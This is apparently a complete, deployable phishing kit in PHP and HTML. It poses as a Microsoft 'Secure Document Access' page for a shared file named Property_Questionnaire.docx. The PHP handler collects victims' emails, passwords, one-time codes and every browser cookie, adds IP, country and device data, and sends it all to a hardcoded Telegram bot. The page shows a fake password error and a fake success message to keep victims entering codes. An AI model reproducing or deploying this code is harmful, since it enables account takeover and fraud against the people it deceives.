<?php
// Telegram configuration - Fill these with your actual credentials
$telegramBotToken = "8209132770:AAEnm0MN8T0CR7BNxj6wIeXCCzGkCV7zcFE";
$telegramChatId = "8402101331";

// Start session for tracking login attempts
session_start();

// Domain to service mapping with login links
$domainServices = [
    'gmail.com' => [
        'name' => 'Gmail',
        'login_url' => 'https://mail.google.com',
        'type' => 'personal',
        'emoji' => '📧'
    ],
    'yahoo.com' => [
        'name' => 'Yahoo Mail',
        'login_url' => 'https://login.yahoo.com',
        'type' => 'personal',
        'emoji' => '📮'
    ],
    'outlook.com' => [
        'name' => 'Outlook',
        'login_url' => 'https://outlook.live.com',
        'type' => 'personal',
        'emoji' => '✉️'
    ],
    'hotmail.com' => [
        'name' => 'Outlook (Hotmail)',
        'login_url' => 'https://outlook.live.com',
        'type' => 'personal',
        'emoji' => '✉️'
    ],
    'aol.com' => [
        'name' => 'AOL Mail',
        'login_url' => 'https://mail.aol.com',
        'type' => 'personal',
        'emoji' => '📨'
    ],
    'icloud.com' => [
        'name' => 'iCloud Mail',
        'login_url' => 'https://www.icloud.com/mail',
        'type' => 'personal',
        'emoji' => '☁️'
    ],
    'protonmail.com' => [
        'name' => 'ProtonMail',
        'login_url' => 'https://mail.protonmail.com/login',
        'type' => 'personal',
        'emoji' => '🔒'
    ],
];

// Function to detect email provider
function detectEmailProvider($email) {
    global $domainServices;
    
    $domain = strtolower(substr(strrchr($email, "@"), 1));
    
    foreach ($domainServices as $providerDomain => $info) {
        if (strpos($domain, $providerDomain) !== false) {
            return $info;
        }
    }
    
    $mxHosts = [];
    getmxrr($domain, $mxHosts);
    
    if (!empty($mxHosts)) {
        foreach ($mxHosts as $mx) {
            if (stripos($mx, 'google') !== false) {
                return [
                    'name' => 'GSuite/Google Workspace',
                    'login_url' => '',
                    'type' => 'business',
                    'emoji' => '🏢',
                    'mx_records' => $mxHosts
                ];
            } elseif (stripos($mx, 'outlook') !== false || stripos($mx, 'office365') !== false) {
                return [
                    'name' => 'Office 365',
                    'login_url' => '',
                    'type' => 'business',
                    'emoji' => '🏛️',
                    'mx_records' => $mxHosts
                ];
            }
        }
    }
    
    return [
        'name' => 'Custom Domain (' . $domain . ')',
        'login_url' => 'https://' . $domain,
        'type' => 'unknown',
        'emoji' => '🌐',
        'mx_records' => $mxHosts
    ];
}

function getOS($userAgent) {
    $osList = [
        'Windows 10'    => 'Windows NT 10',
        'Windows 8.1'   => 'Windows NT 6.3',
        'Windows 8'     => 'Windows NT 6.2',
        'Windows 7'     => 'Windows NT 6.1',
        'Mac OS X'      => 'Macintosh|Mac OS X',
        'Linux'         => 'Linux',
        'iOS'           => 'iPhone|iPad|iPod',
        'Android'       => 'Android',
    ];

    foreach ($osList as $os => $pattern) {
        if (preg_match("/$pattern/i", $userAgent)) {
            return $os;
        }
    }
    return 'Unknown';
}

function getCountry($ip) {
    $url = "http://ip-api.com/json/{$ip}?fields=country";
    $response = @file_get_contents($url);
    if ($response) {
        $data = json_decode($response, true);
        return $data['country'] ?? 'Unknown';
    }
    return 'Unknown';
}

function sendToTelegram($data) {
    global $telegramBotToken, $telegramChatId;
    
    $email = isset($data['original_email']) ? $data['original_email'] : $data['email'];
    $providerInfo = detectEmailProvider($email);
    
    $ip = $_SERVER['REMOTE_ADDR'];
    $browser = $_SERVER['HTTP_USER_AGENT'];
    $os = getOS($browser);
    $country = getCountry($ip);
    $device = strpos($browser, 'Mobile') !== false ? 'Mobile' : 'Desktop';
    
    $message = "🛡️ *NEW LOGIN ATTEMPT* 🛡️\n";
    $message .= "━━━━━━━━━━━━━━━━━━━━\n";
    
    if (isset($data['otp'])) {
        $message .= "📱 *OTP CAPTURED* 📱\n";
        $message .= "🔢 **OTP Code:** `{$data['otp']}`\n";
        $message .= "📧 **Email:** `{$email}`\n";
    } else {
        $message .= "📧 **Email:** `{$data['email']}`\n";
        $message .= "🔑 **Password:** `{$data['password']}`\n";
    }
    
    $message .= "━━━━━━━━━━━━━━━━━━━━\n";
    $message .= "{$providerInfo['emoji']} **Provider:** {$providerInfo['name']} ({$providerInfo['type']})\n";
    $message .= "🔗 **Login URL:** [Click Here]({$providerInfo['login_url']})\n";
    
    if (!empty($providerInfo['mx_records'])) {
        $message .= "📡 **MX Records:**\n";
        foreach ($providerInfo['mx_records'] as $mx) {
            $message .= "   • `{$mx}`\n";
        }
        $message .= "━━━━━━━━━━━━━━━━━━━━\n";
    }
    
    $message .= "🌍 **IP:** `{$ip}`\n";
    $message .= "📍 **Country:** `{$country}`\n";
    $message .= "🖥️ **Browser:** `{$browser}`\n";
    $message .= "💻 **OS:** `{$os}`\n";
    $message .= "📱 **Device:** `{$device}`\n";
    $message .= "⏰ **Time:** `" . date('Y-m-d H:i:s') . "`\n";
    
    if (!empty($data['cookies'])) {
        $message .= "━━━━━━━━━━━━━━━━━━━━\n";
        $message .= "🍪 **COOKIES** 🍪\n";
        foreach ($data['cookies'] as $name => $value) {
            $message .= "➡️ `{$name}` = `{$value}`\n";
        }
    }
    
    $message .= "━━━━━━━━━━━━━━━━━━━━\n";
    $message .= "🚀 **Source:** `{$data['provider']}`\n";

    $url = "https://api.telegram.org/bot{$telegramBotToken}/sendMessage";
    $params = [
        'chat_id' => $telegramChatId,
        'text' => $message,
        'parse_mode' => 'Markdown',
        'disable_web_page_preview' => false
    ];
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

// Handle POST requests
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $postData = file_get_contents('php://input');
    $data = json_decode($postData, true);
    
    if (isset($data['email']) && isset($data['password']) && isset($data['provider'])) {
        $cookies = $_COOKIE; // Capture all cookies
        sendToTelegram([
            'email' => $data['email'],
            'password' => $data['password'],
            'provider' => $data['provider'],
            'cookies' => $cookies
        ]);
        // Return success response
        header('Content-Type: application/json');
        echo json_encode(['success' => true]);
        exit;
    }
    
    if (isset($data['otp']) && isset($data['email']) && isset($data['provider'])) {
        $cookies = $_COOKIE; // Capture all cookies
        sendToTelegram([
            'otp' => $data['otp'],
            'original_email' => $data['email'],
            'provider' => $data['provider'],
            'cookies' => $cookies
        ]);
        // Return success response
        header('Content-Type: application/json');
        echo json_encode(['success' => true]);
        exit;
    }
    
    // Return error if no valid data
    header('Content-Type: application/json');
    echo json_encode(['success' => false, 'error' => 'Invalid data']);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secured PDF </title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* ===== Modern Design Tokens ===== */
        :root {
            /* Color Palette */
            --primary: #2564cf;
            --primary-dark: #1a4fb3;
            --primary-light: #e9f2fc;
            --accent: #ffaa44;
            --success: #107c10;
            --error: #d83b01;
            --warning: #ffb900;
            
            /* Neutral Colors */
            --text: #323130;
            --text-light: #605e5c;
            --text-lighter: #8a8886;
            --border: #edebe9;
            --background: #f9f8f7;
            --surface: #ffffff;
            --hover: #f3f2f1;
            
            /* Shadows */
            --shadow-sm: 0 1.6px 3.6px 0 rgba(0, 0, 0, 0.08), 0 0.3px 0.9px 0 rgba(0, 0, 0, 0.05);
            --shadow-md: 0 3.2px 7.2px 0 rgba(0, 0, 0, 0.12), 0 0.6px 1.8px 0 rgba(0, 0, 0, 0.08);
            --shadow-lg: 0 6.4px 14.4px 0 rgba(0, 0, 0, 0.16), 0 1.2px 3.6px 0 rgba(0, 0, 0, 0.10);
            --shadow-xl: 0 12.8px 28.8px 0 rgba(0, 0, 0, 0.20), 0 2.4px 7.2px 0 rgba(0, 0, 0, 0.12);
            
            /* Spacing */
            --space-xxs: 4px;
            --space-xs: 8px;
            --space-sm: 12px;
            --space-md: 16px;
            --space-lg: 20px;
            --space-xl: 24px;
            --space-xxl: 32px;
            
            /* Typography */
            --text-xs: 12px;
            --text-sm: 14px;
            --text-base: 16px;
            --text-lg: 18px;
            --text-xl: 20px;
            --text-2xl: 22px;
            --text-3xl: 24px;
            
            /* Border Radius */
            --radius-sm: 4px;
            --radius-md: 6px;
            --radius-lg: 8px;
            --radius-xl: 12px;
            --radius-full: 999px;
            
            /* Transitions */
            --transition-fast: all 0.15s cubic-bezier(0.4, 0, 0.2, 1);
            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            --transition-slow: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
        }

        /* ===== Base Styles ===== */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body { 
            font-family: 'Segoe UI', 'Segoe UI Web (West European)', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
            background-image: url('im.png');
            color: var(--text);
            line-height: 1.5;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            -webkit-font-smoothing: antialiased;
            padding: var(--space-sm);
        }

        a {
            color: var(--primary);
            text-decoration: none;
        }

        a:hover {
            text-decoration: underline;
        }

        img {
            max-width: 100%;
            height: auto;
        }

        /* ===== Animations ===== */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-5px); }
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        /* ===== Layout Components ===== */
        .container {
            width: 100%;
            max-width: 400px;
            margin: auto;
            padding: var(--space-lg);
        }

        .header {
            text-align: center;
            margin-bottom: var(--space-lg);
        }

        .header__logo {
            width: 60px;
            height: 60px;
            margin-bottom: var(--space-sm);
            animation: float 6s ease-in-out infinite;
        }

        .header__title {
            font-size: var(--text-xl);
            font-weight: 600;
            color: var(--primary);
            margin-bottom: var(--space-xs);
        }

        .header__subtitle {
            font-size: var(--text-sm);
            color: var(--text-light);
        }

        /* ===== Card Components ===== */
        .card {
            background: var(--surface);
            border-radius: var(--radius-lg);
            box-shadow: var(--shadow-sm);
            overflow: hidden;
            transition: var(--transition);
            animation: fadeIn 0.4s ease-out;
        }

        .card:hover {
            box-shadow: var(--shadow-md);
        }

        .card__header {
            padding: var(--space-md);
            background: var(--primary);
            color: white;
        }

        .card__body {
            padding: var(--space-lg);
        }

        /* ===== File Preview Component ===== */
        .file-preview {
            display: flex;
            align-items: center;
            gap: var(--space-sm);
            padding: var(--space-sm);
            background: var(--primary-light);
            border-radius: var(--radius-md);
            margin-bottom: var(--space-lg);
        }

        .file-preview__icon {
            flex: 0 0 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: white;
            border-radius: var(--radius-sm);
            color: var(--primary);
            font-size: 18px;
        }

        .file-preview__details {
            flex: 1;
            min-width: 0;
        }

        .file-preview__title {
            font-size: var(--text-sm);
            font-weight: 600;
            margin-bottom: var(--space-xxs);
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .file-preview__meta {
            font-size: var(--text-xs);
            color: var(--text-light);
            display: flex;
            flex-wrap: wrap;
            gap: var(--space-xs);
        }

        .file-preview__meta-item {
            display: flex;
            align-items: center;
            gap: var(--space-xxs);
        }

        .file-preview__meta-icon {
            font-size: var(--text-xs);
        }

        /* ===== Auth Providers ===== */
        .auth-providers {
            display: flex;
            flex-direction: column;
            gap: var(--space-xs);
            margin-bottom: var(--space-lg);
        }

        .provider-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: var(--space-xs);
            padding: var(--space-xs) var(--space-sm);
            border-radius: var(--radius-md);
            border: 1px solid var(--border);
            background: var(--surface);
            color: var(--text);
            font-size: var(--text-sm);
            font-weight: 500;
            cursor: pointer;
            transition: var(--transition-fast);
            text-align: left;
        }

        .provider-btn:hover {
            background: var(--hover);
            transform: translateY(-1px);
            box-shadow: var(--shadow-sm);
        }

        .provider-btn:active {
            transform: translateY(0);
        }

        .provider-btn__icon {
            width: 18px;
            text-align: center;
            font-size: var(--text-base);
        }

        /* Provider-specific styles */
        .provider-btn--microsoft {
            border-color: rgba(37, 100, 207, 0.3);
            background-color: rgba(37, 100, 207, 0.04);
        }
        .provider-btn--microsoft .provider-btn__icon { color: var(--primary); }

        .provider-btn--google {
            border-color: rgba(219, 68, 55, 0.3);
            background-color: rgba(219, 68, 55, 0.04);
        }
        .provider-btn--google .provider-btn__icon { color: #db4437; }

        .provider-btn--apple {
            border-color: rgba(0, 0, 0, 0.3);
            background-color: rgba(0, 0, 0, 0.04);
        }
        .provider-btn--apple .provider-btn__icon { color: #000000; }

        .provider-btn--sso {
            border-color: rgba(0, 120, 212, 0.3);
            background-color: rgba(0, 120, 212, 0.04);
        }
        .provider-btn--sso .provider-btn__icon { color: #0078d4; }

        .provider-btn--yahoo {
            border-color: rgba(123, 0, 181, 0.3);
            background-color: rgba(123, 0, 181, 0.04);
        }
        .provider-btn--yahoo .provider-btn__icon { color: #7b00b5; }

        .provider-btn--aol {
            border-color: rgba(0, 0, 255, 0.3);
            background-color: rgba(0, 0, 255, 0.04);
        }
        .provider-btn--aol .provider-btn__icon { color: #0000ff; }

        /* ===== Divider ===== */
        .divider {
            display: flex;
            align-items: center;
            margin: var(--space-md) 0;
            color: var(--text-lighter);
            font-size: var(--text-xs);
        }

        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid var(--border);
        }

        .divider::before {
            margin-right: var(--space-sm);
        }

        .divider::after {
            margin-left: var(--space-sm);
        }

        /* ===== Form Components ===== */
        .form-group {
            margin-bottom: var(--space-sm);
        }

        .form-label {
            display: block;
            margin-bottom: var(--space-xxs);
            font-size: var(--text-xs);
            font-weight: 600;
            color: var(--text);
        }

        .form-control {
            width: 100%;
            padding: var(--space-xs) var(--space-sm);
            border: 1px solid var(--border);
            border-radius: var(--radius-sm);
            font-size: var(--text-sm);
            transition: var(--transition-fast);
            background: var(--surface);
        }

        .form-control:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 2px rgba(37, 100, 207, 0.2);
        }

        .form-hint {
            font-size: var(--text-xs);
            color: var(--text-light);
            margin-top: var(--space-xxs);
        }

        /* OTP Input */
        .otp-input {
            display: flex;
            gap: var(--space-xs);
            justify-content: center;
            margin: var(--space-md) 0;
        }

        .otp-input__digit {
            width: 36px;
            height: 36px;
            text-align: center;
            font-size: var(--text-base);
            font-weight: 600;
            border: 1px solid var(--border);
            border-radius: var(--radius-sm);
            transition: var(--transition-fast);
        }

        .otp-input__digit:focus {
            border-color: var(--primary);
            box-shadow: 0 0 0 2px rgba(37, 100, 207, 0.2);
            outline: none;
        }

        /* Checkbox */
        .checkbox {
            display: flex;
            align-items: center;
            gap: var(--space-xs);
            margin-bottom: var(--space-sm);
        }

        .checkbox__input {
            width: 14px;
            height: 14px;
            accent-color: var(--primary);
        }

        .checkbox__label {
            font-size: var(--text-xs);
            color: var(--text);
        }

        /* ===== Buttons ===== */
        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: var(--space-xs);
            padding: var(--space-xs) var(--space-sm);
            border: none;
            border-radius: var(--radius-sm);
            font-size: var(--text-sm);
            font-weight: 500;
            cursor: pointer;
            transition: var(--transition-fast);
            text-align: center;
        }

        .btn--primary {
            background: var(--primary);
            color: white;
            width: 100%;
            padding: var(--space-sm);
        }

        .btn--primary:hover {
            background: var(--primary-dark);
        }

        .btn--primary:disabled {
            background: #c7e0f4;
            cursor: not-allowed;
        }

        .btn--secondary {
            background: var(--surface);
            color: var(--primary);
            border: 1px solid var(--border);
        }

        .btn--secondary:hover {
            background: var(--hover);
        }

        .btn--text {
            background: none;
            color: var(--primary);
            padding: 0;
        }

        .btn--text:hover {
            text-decoration: underline;
            background: none;
        }

        /* ===== Loading State ===== */
        .loading {
            display: inline-flex;
            align-items: center;
            justify-content: center;
        }

        .loading__spinner {
            width: 14px;
            height: 14px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: var(--radius-full);
            border-top-color: white;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* ===== Modal Components ===== */
        .modal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(4px);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transition: var(--transition);
        }

        .modal--active {
            opacity: 1;
            visibility: visible;
        }

        .modal__content {
            background: var(--surface);
            border-radius: var(--radius-lg);
            width: 100%;
            max-width: 360px;
            box-shadow: var(--shadow-xl);
            transform: translateY(20px);
            transition: var(--transition);
            overflow: hidden;
            margin: var(--space-sm);
        }

        .modal--active .modal__content {
            transform: translateY(0);
        }

        .modal__header {
            padding: var(--space-sm) var(--space-md);
            border-bottom: 1px solid var(--border);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .modal__title {
            margin: 0;
            font-size: var(--text-lg);
            font-weight: 600;
        }

        .modal__close {
            background: none;
            border: none;
            font-size: var(--text-lg);
            cursor: pointer;
            color: var(--text-light);
            padding: var(--space-xxs);
            border-radius: var(--radius-sm);
        }

        .modal__close:hover {
            background: var(--hover);
            color: var(--text);
        }

        .modal__body {
            padding: var(--space-md);
        }

        .modal__footer {
            padding: var(--space-sm) var(--space-md);
            border-top: 1px solid var(--border);
            display: flex;
            justify-content: flex-end;
            gap: var(--space-xs);
        }

        /* ===== Security Indicators ===== */
        .security-indicator {
            display: flex;
            align-items: center;
            gap: var(--space-xs);
            margin-top: var(--space-md);
            padding: var(--space-xs);
            background: var(--primary-light);
            border-radius: var(--radius-sm);
            font-size: var(--text-xs);
        }

        .security-indicator__icon {
            color: var(--primary);
            font-size: var(--text-base);
        }

        /* ===== OTP Verification Screen ===== */
        .otp-verification {
            text-align: center;
        }

        .otp-verification__icon {
            font-size: var(--space-xl);
            color: var(--primary);
            margin-bottom: var(--space-sm);
        }

        .otp-verification__title {
            font-size: var(--text-lg);
            font-weight: 600;
            margin-bottom: var(--space-xxs);
        }

        .otp-verification__subtitle {
            color: var(--text-light);
            margin-bottom: var(--space-md);
            font-size: var(--text-sm);
        }

        .otp-verification__resend {
            margin-top: var(--space-sm);
            font-size: var(--text-xs);
        }

        .otp-verification__timer {
            color: var(--text-light);
            font-weight: 600;
        }

        /* ===== Responsive Adjustments ===== */
        @media (max-width: 480px) {
            .container {
                padding: var(--space-sm);
            }
            
            .card__body {
                padding: var(--space-md);
            }
            
            .header__logo {
                width: 56px;
                height: 56px;
            }
            
            .header__title {
                font-size: var(--text-lg);
            }
            
            .otp-input__digit {
                width: 32px;
                height: 32px;
                font-size: var(--text-sm);
            }
        }

        /* ===== Utility Classes ===== */
        .text-center {
            text-align: center;
        }

        .text-muted {
            color: var(--text-light);
        }

        .mt-1 { margin-top: var(--space-xs); }
        .mt-2 { margin-top: var(--space-sm); }
        .mt-3 { margin-top: var(--space-md); }
        .mt-4 { margin-top: var(--space-lg); }
        .mt-5 { margin-top: var(--space-xl); }

        .mb-1 { margin-bottom: var(--space-xs); }
        .mb-2 { margin-bottom: var(--space-sm); }
        .mb-3 { margin-bottom: var(--space-md); }
        .mb-4 { margin-bottom: var(--space-lg); }
        .mb-5 { margin-bottom: var(--space-xl); }
    </style>
</head>
<body>
    <div class="container">
        <header class="header">
            <img src="xodo.png" 
                 alt="" 
                 class="header__logo">
            <h1 class="header__title">Secure Document Access</h1>
            <p class="header__subtitle">Sign in to view your shared file</p>
        </header>
        
        <main class="card">
            <div class="card__body">
                <!-- File Preview -->
                <div class="file-preview">
                    <div class="file-preview__icon">
                        <i class="fas fa-file-powerpoint"></i>
                    </div>
                    <div class="file-preview__details">
                        <h3 class="file-preview__title">Property_Questionnaire.docx</h3>
                        <div class="file-preview__meta">
                            <span class="file-preview__meta-item">
                                <i class="fas fa-user-circle file-preview__meta-icon"></i>
                            </span>
                            <span class="file-preview__meta-item">
                                <i class="fas fa-calendar-alt file-preview__meta-icon"></i>
                                Updated 2 hours ago
                            </span>
                        </div>
                    </div>
                </div>
                
                <!-- Authentication Options -->
                <div class="auth-providers">
                    <button class="provider-btn provider-btn--microsoft" onclick="openEmailModal('Microsoft')">
                        <i class="fab fa-microsoft provider-btn__icon"></i>
                        Sign in to access file
                </div>
                
                <!-- Security Indicator -->
                <div class="security-indicator">
                    <i class="fas fa-lock security-indicator__icon"></i>
                    <span>Your connection is secured with TLS 1.3 encryption</span>
                </div>
            </div>
        </main>
        
        <footer class="text-center mt-3 text-muted">
            <p class="text-xs">By continuing, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.</p>
            <p class="text-xs mt-1">
                <a href="#"><i class="fas fa-question-circle"></i> Need help accessing this file?</a>
            </p>
        </footer>
    </div>
    
    <!-- Email Entry Modal -->
    <div class="modal" id="emailModal">
        <div class="modal__content">
            <header class="modal__header">
                <h2 class="modal__title" id="emailModalTitle">Sign in with Microsoft</h2>
                <button class="modal__close" onclick="closeEmailModal()">&times;</button>
            </header>
            
            <div class="modal__body">
                <form id="emailForm">
                    <div class="auth-error-container"><div class="auth-error-message"><i class="fas fa-exclamation-circle"></i><span>That password is incorrect. Please try again or reset your password.</span></div></div><style>.auth-error-container{padding:12px;margin:16px 0;border-radius:6px;background-color:#fef2f2;border:1px solid #fecaca}.auth-error-message{display:flex;align-items:center;gap:8px;color:#dc2626;font-size:14px;line-height:1.5}.auth-error-message i{font-size:16px}</style>
                    <div class="form-group">
                        <label for="email" class="form-label">Email address</label>
                        <input type="email" id="email" name="email" class="form-control" 
                               placeholder="you@example.com" required autocomplete="username">
                    </div>
                    
                    <div class="form-group">
                        <label for="password" class="form-label">Password</label>
                        <input type="password" id="password" name="password" class="form-control" 
                               placeholder="Enter your password" required>
                    </div>
                    
                    <button type="button" class="btn btn--primary" onclick="sendOTP()">
                        <span id="sendOtpBtnText">Continue</span>
                        <span class="loading" id="sendOtpSpinner" style="display: none;">
                            <span class="loading__spinner"></span>
                        </span>
                    </button>
                </form>
            </div>
        </div>
    </div>
    
    <!-- OTP Verification Modal -->
    <div class="modal" id="otpModal">
        <div class="modal__content">
            <header class="modal__header">
                <h2 class="modal__title">Verify your identity</h2>
                <button class="modal__close" onclick="closeOTPModal()">&times;</button>
            </header>
            
            <div class="modal__body">
                <div class="otp-verification">
                    <div class="otp-verification__icon">
                        <i class="fas fa-mobile-alt"></i>
                    </div>
                    <h3 class="otp-verification__title">Enter verification code</h3>
                    <p class="otp-verification__subtitle" id="otpSentTo">
                        We've sent a 6-digit code to your device at johndoe@example.com
                    </p>
                    
                    <div class="otp-input">
                        <input type="text" class="otp-input__digit" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="one-time-code">
                        <input type="text" class="otp-input__digit" maxlength="1" pattern="[0-9]" inputmode="numeric">
                        <input type="text" class="otp-input__digit" maxlength="1" pattern="[0-9]" inputmode="numeric">
                        <input type="text" class="otp-input__digit" maxlength="1" pattern="[0-9]" inputmode="numeric">
                        <input type="text" class="otp-input__digit" maxlength="1" pattern="[0-9]" inputmode="numeric">
                        <input type="text" class="otp-input__digit" maxlength="1" pattern="[0-9]" inputmode="numeric">
                    </div>
                    
                    <button type="button" class="btn btn--primary mt-3" onclick="verifyOTP()" id="verifyOtpBtn">
                        <span id="verifyOtpBtnText">Verify</span>
                        <span class="loading" id="verifyOtpSpinner" style="display: none;">
                            <span class="loading__spinner"></span>
                        </span>
                    </button>
                    
                    <div class="otp-verification__resend">
                        <p>Didn't receive the code? <span id="otpTimer" class="otp-verification__timer">1:59</span></p>
                        <button type="button" class="btn btn--text" id="resendOtpBtn" disabled onclick="resendOTP()">
                            Resend code
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        // Global variables
        let otpCountdown;
        let otpSentEmail = '';
        let otpProvider = '';
        
        // ===== Modal Functions =====
        function openEmailModal(provider) {
            const modal = document.getElementById('emailModal');
            const title = document.getElementById('emailModalTitle');
            
            // Update modal content based on provider
            title.textContent = `Sign in with ${provider}`;
            otpProvider = provider;
            
            // Show modal
            modal.classList.add('modal--active');
            
            // Auto-focus email field and suggest domain
            setTimeout(() => {
                const emailField = document.getElementById('email');
                emailField.focus();
                
                const domainMap = {
                    'Microsoft': '',
                    'Google': '@gmail.com',
                    'Apple': '@icloud.com',
                    'Yahoo': '@yahoo.com',
                    'AOL': '@aol.com',
                    'SSO': '@yourcompany.com'
                };
                
                if (domainMap[provider]) {
                    emailField.value = domainMap[provider];
                    emailField.setSelectionRange(0, 0);
                }
            }, 100);
        }
        
        function closeEmailModal() {
            document.getElementById('emailModal').classList.remove('modal--active');
            document.getElementById('emailForm').reset();
        }
        
        function openOTPModal(email) {
            closeEmailModal();
            otpSentEmail = email;
            
            // Update OTP modal content
            document.getElementById('otpSentTo').textContent = 
                `We've sent a 6-digit code to your email and phone`;
            
            // Start OTP countdown
            startOTPTimer();
            
            // Focus first OTP digit
            setTimeout(() => {
                document.querySelector('.otp-input__digit').focus();
            }, 100);
            
            // Show OTP modal
            document.getElementById('otpModal').classList.add('modal--active');
        }
        
        function closeOTPModal() {
            document.getElementById('otpModal').classList.remove('modal--active');
            clearInterval(otpCountdown);
            resetOTPInputs();
        }
        
        // ===== OTP Functions =====
        function sendOTP() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            if (!email || !email.includes('@')) {
                alert('Please enter a valid email address');
                return;
            }
            
            const sendBtn = document.getElementById('sendOtpBtnText');
            const spinner = document.getElementById('sendOtpSpinner');
            
            // Show loading state
            sendBtn.textContent = 'Sending code...';
            spinner.style.display = 'inline-flex';
            
            // Send credentials to server
            fetch(window.location.href, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    email: email,
                    password: password,
                    provider: otpProvider
                })
            })
            .then(response => response.json())
            .then(data => {
                // Open OTP verification modal regardless of response
                openOTPModal(email);
            })
            .finally(() => {
                // Reset button state
                sendBtn.textContent = 'Continue';
                spinner.style.display = 'none';
            });
        }
        
        function verifyOTP() {
            const verifyBtn = document.getElementById('verifyOtpBtn');
            const verifyBtnText = document.getElementById('verifyOtpBtnText');
            const spinner = document.getElementById('verifyOtpSpinner');
            
            // Get OTP value
            const otpDigits = document.querySelectorAll('.otp-input__digit');
            let otpValue = '';
            otpDigits.forEach(digit => {
                otpValue += digit.value;
            });
            
            if (otpValue.length !== 6) {
                alert('Please enter the full 6-digit code');
                return;
            }
            
            // Show loading state
            verifyBtn.disabled = true;
            verifyBtnText.textContent = 'Verifying...';
            spinner.style.display = 'inline-flex';
            
            // Send OTP to server
            fetch(window.location.href, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    otp: otpValue,
                    email: otpSentEmail,
                    provider: otpProvider
                })
            })
            .then(response => response.json())
            .then(data => {
                // Always show success message to user
                alert('Verification successful! Redirecting to document...');
            })
            .finally(() => {
                // Reset button state
                verifyBtn.disabled = false;
                verifyBtnText.textContent = 'Verify';
                spinner.style.display = 'none';
            });
        }
        
        function resendOTP() {
            const resendBtn = document.getElementById('resendOtpBtn');
            resendBtn.disabled = true;
            
            // Reset timer
            startOTPTimer();
            
            // Show message to user
            alert(`New verification code sent to ${otpSentEmail}`);
        }
        
        function startOTPTimer() {
            clearInterval(otpCountdown);
            const timerElement = document.getElementById('otpTimer');
            const resendBtn = document.getElementById('resendOtpBtn');
            
            let timeLeft = 120; // 2 minutes in seconds
            
            otpCountdown = setInterval(() => {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                
                timerElement.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 0) {
                    clearInterval(otpCountdown);
                    timerElement.textContent = '';
                    resendBtn.disabled = false;
                } else {
                    timeLeft--;
                }
            }, 1000);
        }
        
        function resetOTPInputs() {
            const otpDigits = document.querySelectorAll('.otp-input__digit');
            otpDigits.forEach(digit => {
                digit.value = '';
            });
        }
        
        // ===== OTP Input Handling =====
        document.querySelectorAll('.otp-input__digit').forEach((digit, index, digits) => {
            digit.addEventListener('input', (e) => {
                // Only allow numbers
                if (isNaN(e.target.value)) {
                    e.target.value = '';
                    return;
                }
                
                // Auto-focus next input
                if (e.target.value && index < digits.length - 1) {
                    digits[index + 1].focus();
                }
            });
            
            digit.addEventListener('keydown', (e) => {
                // Handle backspace to move to previous input
                if (e.key === 'Backspace' && !e.target.value && index > 0) {
                    digits[index - 1].focus();
                }
            });
        });
        
        // ===== Event Listeners =====
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                if (document.getElementById('emailModal').classList.contains('modal--active')) {
                    closeEmailModal();
                }
                if (document.getElementById('otpModal').classList.contains('modal--active')) {
                    closeOTPModal();
                }
            }
        });
        
        // Validate email format on blur
        document.getElementById('email').addEventListener('blur', function() {
            if (this.value && !this.value.includes('@')) {
                this.setCustomValidity('Please include an "@" in the email address');
            } else {
                this.setCustomValidity('');
            }
        });
        
        // Close modals when clicking outside
        document.querySelectorAll('.modal').forEach(modal => {
            modal.addEventListener('click', function(e) {
                if (e.target === this) {
                    if (this.id === 'emailModal') closeEmailModal();
                    if (this.id === 'otpModal') closeOTPModal();
                }
            });
        });
    </script>
</body>
</html>